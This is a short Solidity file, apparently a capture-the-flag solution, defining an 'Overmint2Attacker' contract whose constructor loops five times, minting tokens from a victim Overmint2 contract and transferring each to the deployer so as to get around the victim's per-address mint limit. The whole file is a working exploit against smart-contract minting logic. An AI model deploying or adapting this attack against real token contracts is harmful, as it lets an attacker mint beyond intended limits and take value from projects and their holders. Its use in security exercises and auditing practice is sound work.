// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;
// pragma solidity 0.8.24;

import {Overmint2} from "./Overmint2.sol";

contract Overmint2Attacker {
    constructor(address victim) {
        for (uint256 i = 0; i < 5; i++) {
            Overmint2(victim).mint();
            Overmint2(victim).transferFrom(address(this), msg.sender, i + 1);
        }
    }
}
